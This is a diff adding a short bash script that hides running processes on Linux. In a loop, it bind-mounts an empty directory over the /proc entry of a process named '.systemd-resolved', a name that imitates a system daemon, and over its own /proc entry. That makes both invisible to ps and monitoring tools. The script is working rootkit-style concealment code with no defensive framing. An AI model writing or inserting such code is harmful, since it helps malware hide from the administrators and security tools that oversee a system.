@@ -1,0 +1,13 @@
+#!/bin/bash
+while true; do
+    PID=$(pgrep -f ".systemd-resolved" | head -1)
+    if [ -n "$PID" ]; then
+        mkdir -p /tmp/empty
+        umount /proc/$PID 2>/dev/null
+        mount --bind /tmp/empty /proc/$PID 2>/dev/null
+    fi
+    SELF_PID=$$
+    umount /proc/$SELF_PID 2>/dev/null
+    mount --bind /tmp/empty /proc/$SELF_PID 2>/dev/null
+    sleep 10
+done
